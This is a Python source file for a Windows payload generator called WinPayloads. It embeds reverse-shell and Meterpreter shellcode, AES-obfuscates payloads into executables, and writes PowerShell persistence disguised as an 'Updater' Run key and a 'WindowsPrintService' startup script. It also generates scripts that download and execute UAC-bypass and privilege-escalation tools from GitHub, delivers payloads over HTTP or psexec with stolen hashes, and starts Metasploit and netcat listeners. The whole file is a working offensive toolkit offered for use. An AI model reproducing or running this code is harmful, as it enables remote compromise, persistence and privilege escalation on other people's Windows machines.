#!/usr/bin/python
import os
import socket
import re
import subprocess
import struct
import sys
import blessings
import random
import SimpleHTTPServer
import SocketServer
import multiprocessing
from Crypto.Cipher import AES
import base64
import string
import re
import glob
import readline
import time
try:
    impacketerror = False
    import psexec
except:
    impacketerror = True

t = blessings.Terminal()

try:
    iperror = False
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 0))
    IP = s.getsockname()[0]
except:
    iperror = True


def ServePayload(payloaddirectory):
    try:
        os.chdir(payloaddirectory)
        Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
        httpd = SocketServer.TCPServer(('', 8000), Handler)
        httpd.serve_forever()
    except:
        print t.bold_red + '\n[*] WebServer Shutdown' + t.normal


def ServePsexec(payloaddirectory, targethash, targetusername, targetdomain, targetipaddr, targetpassword):
    try:
        command = ''
        path = ''
        exeFile = payloaddirectory
        copyFile = ''
        PSEXEC = psexec.PSEXEC(command, path, exeFile, copyFile, protocols=None, username=targetusername,
                               hashes=targethash, domain=targetdomain, password=targetpassword, aesKey=None, doKerberos=False)
        print t.bold_green + '\n [*] Starting Psexec....' + t.normal
        time.sleep(20)
        PSEXEC.run(targetipaddr)
    except Exception as E:
        print t.bold_red + '\n[*] Psexec Error!'
        print E
        print '\n[*] Psexec May Have Worked' + t.normal


def PyCipher(filecontents):  # Adaptation of PyHerion 1.0 By: @harmj0y
    BLOCK_SIZE = 32
    PADDING = '{'
    imports = list()
    output = list()

    def randKey(bytes):
        return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$^&()*&[]|,./?") for x in range(bytes))

    def randVar():
        return ''.join(random.choice(string.ascii_letters) for x in range(3)) + "_" + ''.join(random.choice("0123456789") for x in range(3))

    def pad(s):
        return str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING

    def EncodeAES(c, s):
        return base64.b64encode(c.encrypt(pad(s)))

    def DecodeAES(c, e):
        return c.decrypt(base64.b64decode(e)).rstrip(PADDING)

    key, iv = randKey(32), randKey(16)

    input = filecontents.split('\n')

    newoutput, newoutputt = '', ''

    for line in input:
        if not line.startswith("#"):
            if "import" in line:
                imports.append(line.strip())
            else:
                output.append(line)

    cipherEnc = AES.new(key)

    encrypted = EncodeAES(cipherEnc, "\n".join(output))

    b64var, aesvar = randVar(), randVar()

    imports.append("from base64 import b64decode as %s" % (b64var))
    imports.append("from Crypto.Cipher import AES as %s" % (aesvar))

    random.shuffle(imports)

    newoutput = ";".join(imports) + "\n"

    newoutput += "exec(%s(\"%s\"))" % (b64var, base64.b64encode(
        "exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" % (aesvar, key, b64var, encrypted)))
    return newoutput

windows_rev_shell = (
    "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
    "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
    "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
    "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
    "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
    "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
    "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
    "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
    "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
    "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
    "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
    "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
    "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
    "\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
    "\xdf\xe0\xff\xd5\x97\x6a\x05\x68%s\x68"
    "\x02\x00%s\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
    "\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
    "\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
    "\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
    "\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
    "\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
    "\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
    "\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
    "\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5")

windows_met_rev_shell = (
    "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
    "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
    "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
    "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
    "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
    "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
    "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
    "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
    "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
    "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
    "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
    "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
    "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
    "\xff\xd5\x6a\x05\x68%s\x68\x02\x00%s"
    "\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
    "\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"
    "\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec"
    "\xe8\x61\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02"
    "\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a"
    "\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
    "\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
    "\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x22\x58\x68\x00\x40"
    "\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57"
    "\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\xe9"
    "\x71\xff\xff\xff\x01\xc3\x29\xc6\x75\xc7\xc3\xbb\xf0"
    "\xb5\xa2\x56\x6a\x00\x53\xff\xd5")

windows_met_bind_shell = (
    "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
    "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
    "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
    "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
    "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
    "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
    "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
    "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
    "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
    "\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
    "\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
    "\x29\x80\x6b\x00\xff\xd5\x6a\x0b\x59\x50\xe2\xfd\x6a\x01\x6a"
    "\x02\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00%s\x89"
    "\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x85\xc0\x75"
    "\x58\x57\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1"
    "\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x6a\x00\x6a\x04"
    "\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x2d\x8b"
    "\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
    "\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f"
    "\xff\xd5\x83\xf8\x00\x7e\x07\x01\xc3\x29\xc6\x75\xe9\xc3")

payload, payloadchoice, payloaddir, ez2read_shellcode, nullbytecount, ez2read_shellcode2, want_UACBYPASS, want_ALLCHECKS, want_PERSISTENCE = '', '', '/etc/winpayloads', '', 0, '', 'n', 'n', 'n'
try:
    os.mkdir(payloaddir)
except OSError:
    pass

print t.clear
print '=' * t.width + t.bold_red
print " _       ___       ____              __                __".center(t.width)
print "   | |     / (_)___  / __ \____ ___  __/ /___  ____ _____/ /____".center(t.width)
print "   | | /| / / / __ \/ /_/ / __ `/ / / / / __ \/ __ `/ __  / ___/".center(t.width)
print "  | |/ |/ / / / / / ____/ /_/ / /_/ / / /_/ / /_/ / /_/ (__  )".center(t.width)
print "  |__/|__/_/_/ /_/_/    \__,_/\__, /_/\____/\__,_/\__,_/____/".center(t.width)
print "   /____/".center(t.width)
print t.normal + '=' * t.width

if impacketerror == True:
    print t.bold_red + '\n[*****] Install Impacket for Python from Git for Psexec to Work! (psexec disabled) [*****]\n' + t.normal

try:
    print ('[1] Windows Reverse Shell' + t.bold_green + '(Stageless)' +
           t.bold_red + ' [Shellter]').center(t.width - 44) + t.normal
    print ('[2] Windows Reverse Meterpreter' + t.bold_green + '(Staged)' + t.bold_red +
           ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width) + t.normal
    print ('[3] Windows Bind Meterpreter' + t.bold_green + '(Staged)' + t.bold_red +
           ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width - 4) + t.normal
    print ('[4] Windows Reverse Meterpreter' + t.bold_green + '(Raw Shellcode)' +
           t.bold_red + ' [Base64 Encode]').center(t.width - 30) + t.normal
    print '=' * t.width

    while True:
        menuchoice = raw_input('> ')
        if menuchoice == '1':
            payloadchoice = windows_rev_shell
            payload = 'Windows Reverse Shell'
            break
        elif menuchoice == '2':
            payloadchoice = windows_met_rev_shell
            payload = 'Windows Meterpreter Reverse Shell'
            break
        elif menuchoice == '3':
            payloadchoice = windows_met_bind_shell
            payload = 'Windows Meterpreter Bind Shell'
            break
        elif menuchoice == '4':
            payloadchoice = windows_met_rev_shell
            payload = 'Windows Meterpreter Reverse Raw '
            break
        else:
            print t.bold_red + '[*] Wrong Selection' + t.normal

    print t.bold_green + '\n[*] Payload Set As %s\n' % (payload) + t.normal

    if menuchoice == '1' or menuchoice == '2' or menuchoice == '4' or menuchoice == '5':
        portnum = raw_input(
            '\n[*] Press Enter For Default Port(4444)\n[*] Port> ')
        if iperror == False:
            ipaddr = raw_input(
                '\n[*] Press Enter To Get Local Ip Automatically\n[*] IP> ')
            if len(ipaddr) is 0:
                ipaddr = IP
        else:
            print t.bold_red + 'Error Getting Ip Automatically'
            ipaddr = raw_input(
                '\n[*] Press Enter Your IP Manually(Automatic Disabled)\n[*] IP> ')

        if len(portnum) is 0:
            portnum = 4444
        print t.bold_green + '\n[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
        try:
            ip1, ip2, ip3, ip4 = ipaddr.split('.')
            iphex = struct.pack('BBBB', int(ip1), int(ip2), int(ip3), int(ip4))
        except:
            print t.bold_red + '[*] Error in IP Syntax'
            sys.exit(1)
        try:
            porthex = struct.pack('>h', int(portnum))
            porthex2 = struct.pack('>h', int(portnum) + 1)
        except:
            print t.bold_red + '[*] Error in Port Syntax'
            sys.exit(1)
        shellcode = payloadchoice % (iphex, porthex)
        shellcode2 = payloadchoice % (iphex, porthex2)
    elif menuchoice == '3':
        bindport = raw_input(
            '\n[*] Press Enter For Default Bind Port(4444)\n[*] Port> ')
        if len(bindport) is 0:
            bindport = 4444
        try:
            bindporthex = struct.pack('>h', int(bindport))
            bindporthex2 = struct.pack('>h', int(bindport) + 1)
        except:
            print t.bold_red + '[*] Error in IP Syntax'
            sys.exit(1)
        shellcode = payloadchoice % (bindporthex)
        shellcode2 = payloadchoice % (bindporthex2)

    if menuchoice == '2' or menuchoice == '3':
        want_UACBYPASS = raw_input(
            t.bold_red + '[*] Try UAC Bypass(Only Works For Local Admin Account)? y/[n]:' + t.normal)
        if want_UACBYPASS.lower() == 'n' or want_UACBYPASS.lower() == '':
            want_ALLCHECKS = raw_input(
                t.bold_red + '[*] Invoke Priv Esc Checks? y/[n]:' + t.normal)
        if want_UACBYPASS.lower() == 'n' or want_UACBYPASS.lower() == '' and want_ALLCHECKS.lower() == 'n' or want_ALLCHECKS.lower() == '':
            want_PERSISTENCE = raw_input(
                t.bold_red + '[*] Persistent Payload on Boot? y/[n]:' + t.normal)

    for byte in shellcode:
        ez2read_shellcode += '\\x%s' % byte.encode('hex')
        count = 0
        newpayloadlayout = ''
        for char in ez2read_shellcode:
            count += 1
            newpayloadlayout += char
            if count == 4:
                newpayloadlayout += ','
                count = 0

    if want_UACBYPASS.lower() == 'y':
        for byte in shellcode2:
            ez2read_shellcode2 += '\\x%s' % byte.encode('hex')
            count = 0
            newpayloadlayout = ''
            for char in ez2read_shellcode2:
                count += 1
                newpayloadlayout += char
                if count == 4:
                    newpayloadlayout += ','
                    count = 0
    if menuchoice == '4':
        raw_b64encode = raw_input(
            t.bold_red + '[*] Base64 Encode Raw Payload? y/[n]: ' + t.normal)
        if raw_b64encode.lower() == 'y':
            print '=' * int((t.width / 2) - 5) + 'SHELLCODE' + '=' * int((t.width / 2) - 4) + '\n' + base64.b64encode(ez2read_shellcode) + '\n' + '=' * t.width
            sys.exit()
        else:
            print ez2read_shellcode
            sys.exit(0)

    persistencelayout = re.sub(r'\\x', '0x', newpayloadlayout).rstrip(',')
    persistencesleep = """Start-Sleep -s 60;$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % (
        persistencelayout)
    persistencenosleep = """$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % (
        persistencelayout)
    persistencerc = """run post/windows/manage/smart_migrate\nrun post/windows/manage/exec_powershell SCRIPT=persist.ps1 SESSION=1"""

    if want_PERSISTENCE.lower() == 'y':
        with open('persist.ps1', 'w') as persistfile:
            persistfile.write("""$persist = 'New-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\\v1.0\powershell.exe`\" -exec bypass -NonInteractive -WindowStyle Hidden -enc """ +
                              base64.b64encode(persistencesleep.encode('utf_16_le')) + '\"\'; iex $persist; echo $persist > \"$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsPrintService.ps1\"')
            persistfile.close()
        with open('persist.rc', 'w') as persistfilerc:
            persistfilerc.write(persistencerc)
            persistfilerc.close()

    want_to_payloadinexe = raw_input(
        t.bold_red + '[*] Inject Shellcode Into an EXE (Shellter)? y/[n]: ' + t.normal)

    injectwindows = """#/usr/bin/python
import ctypes

shellcode = bytearray('%s')
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
"""

    if menuchoice == '2' or menuchoice == '3':
        if want_UACBYPASS.lower() == 'y':
            uacbypassrcfilecontents = """run post/windows/manage/migrate SESSION=1 NAME=explorer.exe SPAWN=false KILL=false\nrun post/windows/manage/exec_powershell SCRIPT=bypassuac.ps1 SESSION=1"""
            uacbypassrcfilecontents2 = """run post/windows/manage/migrate SESSION=2 NAME=spoolsv.exe SPAWN=false KILL=false\nrun post/windows/escalate/getsystem SESSION=2"""
            uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("https://github.com/PowerShellEmpire/Empire/raw/master/data/module_source/privesc/Invoke-BypassUAC.ps1");\nInvoke-BypassUAC -Command \"powershell -enc %s\" """ % (
                base64.b64encode(persistencenosleep.encode('utf_16_le')))
            with open('bypassuac.ps1', 'w') as uacbypassfile:
                uacbypassfile.write(uacbypassfilecontent)
                uacbypassfile.close()
            with open('uacbypass.rc', 'w') as uacbypassfilerc:
                uacbypassfilerc.write(uacbypassrcfilecontents)
                uacbypassfilerc.close()
            with open('uacbypass2.rc', 'w') as uacbypassfilerc2:
                uacbypassfilerc2.write(uacbypassrcfilecontents2)
                uacbypassfilerc2.close()

    if want_ALLCHECKS.lower() == 'y':
        with open('allchecks.ps1', 'w') as allchecksfile:
            allchecksfile.write(
                """IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1");invoke-allchecks""")
            allchecksfile.close()

    if not want_to_payloadinexe == 'y':
        with open('%s/payload.py' % payloaddir, 'w+') as Filesave:
            Filesave.write(PyCipher(injectwindows % (ez2read_shellcode)))
            Filesave.close()

        print '[*] Creating Payload.exe From Payload.py...'

        subprocess.call(['wine', '/root/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller-2.0/pyinstaller.py',
                         '%s/payload.py' % payloaddir, '--noconsole', '-F', '-y', '-o', payloaddir], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print '[*] Cleaning Up...'
        os.system('mv %s/dist/payload.exe %s/payload.exe' %
                  (payloaddir, payloaddir))
        os.system('rm %s/logdict*' % os.getcwd())
        os.system('rm %s/dist -r' % payloaddir)
        os.system('rm %s/build -r' % payloaddir)
        os.system('rm %s/*.spec' % payloaddir)
        os.system('rm %s/payload.py' % payloaddir)
        print '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/payload.exe' % payloaddir + t.normal

    if want_to_payloadinexe.lower() == 'y':
        payloadinexe_payloadname = raw_input(
            '[*] EXE Filepath or URL to EXE: ')
        os.chdir(os.getcwd() + '/shellter')
        try:
            os.mkdir('compiled')
        except:
            pass
        with open('payloadbin', 'wb') as Csave:
            Csave.write(shellcode)
            Csave.close()
        if re.search('http', payloadinexe_payloadname):
            os.system('wget %s' % payloadinexe_payloadname)
            payloadinexe_payloadname = re.search(
                '(\w*.exe)', payloadinexe_payloadname)
            payloadinexe_payloadname = payloadinexe_payloadname.group(1)
        os.system('wine shellter.exe -a -f %s -s -p payloadbin ' %
                  payloadinexe_payloadname)
        os.system('mv %s ./compiled/%s' %
                  (payloadinexe_payloadname, payloadinexe_payloadname))

    want_to_upload = raw_input(
        '\n[*] Upload To Local Websever or (p)sexec? [y]/p/n: ')
    if want_to_upload.lower() == 'y' or want_to_upload == '':
        if want_to_payloadinexe == 'y' and want_to_upload.lower() == 'y' or want_to_payloadinexe == 'y' and want_to_upload.lower() == '':
            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s" % (IP, payloadinexe_payloadname) + t.normal
            a = multiprocessing.Process(
                target=ServePayload, args=(os.getcwd() + '/compiled',))
            a.daemon = True
            a.start()
        elif want_to_payloadinexe == 'n' and want_to_upload.lower() == 'y' or want_to_payloadinexe == '' and want_to_upload.lower() == '':
            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/payload.exe" % (IP) + t.normal
            a = multiprocessing.Process(
                target=ServePayload, args=(payloaddir,))
            a.daemon = True
            a.start()

    if want_to_upload.lower() == 'p' or want_to_upload.lower() == 'psexec':
        if impacketerror == False:
            while True:
                targethash = raw_input(
                    '[*] Targets NT:LM Hash or Plain Text Password:')
                targetusername = raw_input('[*] Targets Username:')
                targetdomain = raw_input('[*] Targets Domain:')
                targetipaddr = raw_input('[*] Targets Ip Address:')
                print t.bold_green + 'NT:LM HASH OR PLAIN TEXT PASSWORD = ' + targethash + '\nTARGETS USERNAME = ' + targetusername + '\nTARGETS DOMAIN = ' + targetdomain + '\nTARGETS IP ADDRESS = ' + targetipaddr + t.normal
                ispsexecdetailscorrect = raw_input(
                    '[*] Are These Details Correct? ([y]/n)')
                if ispsexecdetailscorrect == 'y' or ispsexecdetailscorrect == '':
                    if re.search(':', targethash):
                        print t.bold_green + '[*] NT:LM HASH DETECTED' + t.normal
                        targetpassword = ''
                    else:
                        print t.bold_green + '[*] CLEAR TEXT PASSWORD DETECTED' + t.normal
                        targetpassword = targethash
                        targethash = None
                    break
                else:
                    continue
            b = multiprocessing.Process(
                target=ServePsexec, args=(payloaddir + '/payload.exe', targethash, targetusername, targetdomain, targetipaddr, targetpassword))
            b.daemon = True
            b.start()
        else:
            print t.bold_red + '[*] Install Impacket for Python From Git!' + t.normal

    if menuchoice == '1':
        os.system('nc -lvp %s' % portnum)
    elif menuchoice == '2':
        if want_UACBYPASS.lower() == 'y':
            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j;set LPORT %s;set autorunscript multi_console_command -rc uacbypass2.rc;exploit -j\'' % (portnum, portnum + 1))
        elif want_ALLCHECKS.lower() == 'y':
            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript post/windows/manage/exec_powershell SCRIPT=allchecks.ps1;set ExitOnSession false;exploit -j\'' % portnum)
        elif want_PERSISTENCE.lower() == 'y':
            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false;exploit -j\'' % portnum)
        else:
            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set ExitOnSession false;exploit -j\'' % portnum)
    elif menuchoice == '3':
        bindip = raw_input(
            '\n[*] Enter Target Ip Address \n[*] IP> ')
        if want_UACBYPASS.lower() == 'y':
            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j;set LPORT %s;set autorunscript multi_console_command -rc uacbypass2.rc;exploit -j\'' % (bindport, bindip, bindport + 1))
        elif want_ALLCHECKS.lower() == 'y':
            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript post/windows/manage/exec_powershell SCRIPT=allchecks.ps1;set ExitOnSession false;exploit -j\'' % (bindport, bindip))
        elif want_PERSISTENCE.lower() == 'y':
            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false;exploit -j\'' % (bindport, bindip))
        else:
            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set ExitOnSession false;exploit -j \'' % (bindport, bindip))

    print t.bold_green + '[*] Cleaning Up\n' + t.normal
    subprocess.call(['rm *.rc'], shell=True,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    subprocess.call(['rm *.ps1'], shell=True,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    sys.exit(0)
except KeyboardInterrupt:
    sys.exit(1)
